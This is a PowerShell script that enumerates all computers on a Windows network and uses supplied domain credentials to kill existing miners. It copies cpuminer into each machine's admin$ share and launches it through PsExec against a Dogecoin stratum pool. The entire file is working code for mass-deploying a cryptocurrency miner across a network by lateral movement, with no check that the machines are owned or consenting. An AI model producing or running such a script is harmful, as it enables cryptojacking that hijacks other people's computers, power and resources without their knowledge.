function Get-NetView {
	switch -regex (NET.EXE VIEW) { "^\\\\(?<Name>\S+)\s+" {$matches.Name}}
	}

$netuser = Read-Host "Domain Username"
$netpass = Read-Host "Domain Password"

$WORKER   = Read-Host "Worker username"
$PASSWORD = Read-Host "Worker password"
Echo "Need your pool address (looks like stratum+tcp://stratum1.dogechain.info:3333)"
$POOLADDR = Read-Host "Address"
$COMPS = Get-NetView

$kill = Read-Host "Kill cpuminer on remote machines? (y/n)"
$numcomps = $COMPS.Count
if ($kill -eq "y") {
    Echo "Killing all dogenet instances..."
    # kill all running instance of minerd
    foreach ($element in $COMPS) {
        $command = "taskkill.exe /S $($element) /U $($netuser) /P $($netpass) /IM minerd.exe"
        Invoke-Expression $command
        }
    }

Echo "Pushing cpuminer to $($numcomps) network computers..."
# Copy minerd to all machines
foreach ($element in $COMPS) {
    Echo "Copying to $($element)"
    $to = "\\$($element)\admin$"
    $from = ".\minerd"
    Copy-Item $from $to -recurse -Force
    }

Write-Host "Copy operation complete. Press any key to launch."
$x = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

# Execute
foreach ($element in $COMPS) {
    
    Start-Process "powershell.exe" "-Command .\psexec\PsExec.exe /accepteula \\$($element) c:\Windows\minerd\minerd.exe -o $($POOLADDR) -u $($WORKER) -p $($PASSWORD)"
    }

Echo "Finished."
